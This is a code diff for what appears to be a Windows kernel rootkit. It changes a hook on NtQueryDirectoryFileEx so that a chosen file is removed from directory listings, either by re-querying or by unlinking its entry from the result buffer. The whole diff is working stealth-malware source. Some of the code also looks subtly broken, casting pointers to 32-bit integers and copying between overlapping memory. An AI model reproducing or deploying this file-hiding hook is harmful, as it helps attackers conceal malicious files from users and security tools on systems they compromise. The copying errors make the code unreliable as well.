@@ -2,6 +2,7 @@
 
 #include "querydir.h"
 #include "handler.h"
+#include "stdint.h"
 
 UNICODE_STRING hiddenFile;
 
@@ -52,6 +53,64 @@ static void getFileName(PUNICODE_STRING filename, PVOID fileInfo, FILE_INFORMATI
 	filename->MaximumLength = filename->Length;
 }
 
+static ULONG getNextOff(PVOID fileInfo, FILE_INFORMATION_CLASS fileInfoClass) {
+	switch (fileInfoClass) {
+		case FileDirectoryInformation:
+			return ((PFILE_DIRECTORY_INFORMATION)fileInfo)->NextEntryOffset;
+		case FileFullDirectoryInformation:
+			return ((PFILE_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset;
+		case FileBothDirectoryInformation:
+			return ((PFILE_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset;
+		case FileNamesInformation:
+			return ((PFILE_NAMES_INFORMATION)fileInfo)->NextEntryOffset;
+		case FileIdBothDirectoryInformation:
+			return ((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset;
+		case FileIdFullDirectoryInformation:
+			return ((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset;
+		case FileIdGlobalTxDirectoryInformation:
+			return ((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->NextEntryOffset;
+		case FileIdExtdDirectoryInformation:
+			return ((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->NextEntryOffset;
+		case FileIdExtdBothDirectoryInformation:
+			return ((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset;
+		default:
+			return 0;
+	}
+}
+static void clearNextOff(PVOID fileInfo, FILE_INFORMATION_CLASS fileInfoClass) {
+	switch (fileInfoClass) {
+		case FileDirectoryInformation:
+			((PFILE_DIRECTORY_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			break;
+		case FileFullDirectoryInformation:
+			((PFILE_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			break;
+		case FileBothDirectoryInformation:
+			((PFILE_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			break;
+		case FileNamesInformation:
+			((PFILE_NAMES_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			break;
+		case FileIdBothDirectoryInformation:
+			((PFILE_ID_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			break;
+		case FileIdFullDirectoryInformation:
+			((PFILE_ID_FULL_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			break;
+		case FileIdGlobalTxDirectoryInformation:
+			((PFILE_ID_GLOBAL_TX_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			break;
+		case FileIdExtdDirectoryInformation:
+			((PFILE_ID_EXTD_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			break;
+		case FileIdExtdBothDirectoryInformation:
+			((PFILE_ID_EXTD_BOTH_DIR_INFORMATION)fileInfo)->NextEntryOffset = 0;
+			break;
+		default:
+			break;
+	}
+}
+
 NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
 	HANDLE FileHandle,
 	HANDLE Event,
@@ -66,6 +125,8 @@ NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
 ) {
 	NTSTATUS status;
 	UNICODE_STRING us;
+	ULONG nextOff;
+	PVOID prev, curr;
 
 	status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
 
@@ -80,11 +141,38 @@ NTSTATUS NTAPI hookNtQueryDirectoryFileEx(
 		FileInformationClass == FileIdExtdDirectoryInformation ||
 		FileInformationClass == FileIdExtdBothDirectoryInformation)) {
 
-		getFileName(&us, FileInformation, FileInformationClass);
-		DbgPrintEx(0, 0, "[Bot] dir hook %wZ\n", us);
-		if (!RtlCompareUnicodeString(&us, &hiddenFile, TRUE)) {
-			memcpy(us.Buffer, L"lolol.txt", us.Length);
-			DbgPrintEx(0, 0, "[Bot] ----------------YES--------------------\n");
+		//memcpy(us.Buffer, L"lolol.txt", us.Length);
+
+		if (QueryFlags & SL_RETURN_SINGLE_ENTRY) {
+			getFileName(&us, FileInformation, FileInformationClass);
+			if (!RtlCompareUnicodeString(&us, &hiddenFile, TRUE)) {
+				status = origNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
+			}
+		} else {
+			curr = FileInformation;
+			prev = NULL;
+			do {
+				nextOff = getNextOff(curr, FileInformationClass);
+				getFileName(&us, curr, FileInformationClass);
+				if (!RtlCompareUnicodeString(&us, &hiddenFile, TRUE)) {
+					if (nextOff) {
+						//copy rest of the buffer over our entry
+						//    where?             what?                                    how much?
+						//     here              next                     current length - before our entry - our entry
+						memcpy(curr, ((uint8_t*)curr) + nextOff, Length - (((uint32_t)curr) - ((uint32_t)FileInformation)) - nextOff);
+					} else {
+						if (prev) {
+							clearNextOff(prev, FileInformationClass);
+						} else {
+							status = STATUS_NO_MORE_FILES;
+						}
+					}
+					break;
+				}
+
+				prev = curr;
+				curr = ((uint8_t*)curr) + nextOff;
+			} while (nextOff);
 		}
 	}
 
